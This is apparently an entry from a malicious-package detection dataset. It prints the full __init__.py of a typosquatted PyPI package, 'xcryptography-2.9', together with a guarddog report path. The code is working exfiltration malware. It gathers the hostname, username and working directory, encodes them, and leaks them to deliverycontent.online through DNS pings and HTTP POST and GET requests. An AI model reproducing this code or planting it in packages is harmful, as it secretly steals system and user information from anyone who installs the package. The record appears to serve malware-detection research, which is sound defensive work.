[
  {
    "pyfile": "__init__.py",
    "malicious_code_snippets": "import os\nimport base64\nimport random\n\n# Collect system information\npackage = \"xcryptography_2.9\"\ndns_domain = \".sub.deliverycontent.online\"\nhttp_domain = \"www.deliverycontent.online\"\n\nhostname = \"\"\ntry:\n    hostname = os.uname().nodename\nexcept Exception:\n    pass\nif hostname == \"\":\n    try:\n        hostname = os.environ['COMPUTERNAME']\n    except Exception:\n        pass\n\nusername = \"\"\ntry:\n    import getpass\n    username = getpass.getuser()\nexcept Exception:\n    pass\n\nexecution_path = \"\"\ntry:\n    execution_path = os.getcwd()\nexcept Exception:\n    pass\n\ndata = \"%s;%s;%s;%s\" % (hostname, username, package, execution_path)\nb64data = base64.b64encode(data.encode()).decode()\n\ndata_part_length = 29\nparts_count = len(b64data) // data_part_length\nif len(b64data) % data_part_length > 0:\n    parts_count += 1\nparts_count = min(parts_count, 255)\n\nrandom_number = random.randint(0, 254)\n\n# Exfiltrate data via DNS (ping)\nencoded_data = \"\"\nfor c in b64data[:data_part_length]:\n    encoded_data += \"%02x\" % ord(c)\ndata_to_send = \"f%s%s%s\" % (\"%02x\" % random_number, \"%02x\" % parts_count, encoded_data)\ndomain = data_to_send + dns_domain\ntry:\n    os.system(\"ping %s\" % domain)\nexcept Exception:\n    pass\n\nfor i in range(1, parts_count):\n    encoded_data = \"\"\n    for c in b64data[data_part_length*i: data_part_length*(i+1)]:\n        encoded_data += \"%02x\" % ord(c)\n    data_to_send = \"%s%s%s\" % (\"%02x\" % random_number, \"%02x\" % i, encoded_data)\n    domain = data_to_send + dns_domain\n    try:\n        os.system(\"ping %s\" % domain)\n    except Exception: \n        pass\n\n# Exfiltrate data via HTTP POST/GET\nencoded_data = \"\"\nfor c in b64data:\n    encoded_data += \"%02x\" % ord(c)\ndata_post = \"%s%s%s\" % (\"gjeiiq1\", \"%02x\" % random_number, encoded_data)\ndata_get = \"%s%s\" % (\"%02x\" % random_number, encoded_data)\n\ntry:\n    import urllib.request\n    r = urllib.request.urlopen(\"http://%s/p\" % http_domain, data=data_post.encode(), timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import urllib.request\n    r = urllib.request.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import requests\n    r = requests.post(\"http://%s/p\" % http_domain, data=data_post, timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import requests\n    r = requests.get(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import urllib\n    r = urllib.urlopen(\"http://%s/p\" % http_domain, data=data_post)\nexcept Exception:\n    pass\n\ntry:\n    import urllib\n    r = urllib.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get))\nexcept Exception:\n    pass"
  },
  {
    "metadata": {
      "package_name": "xcryptography-2.9",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/xcryptography-2.9.txt"
    }
  }
]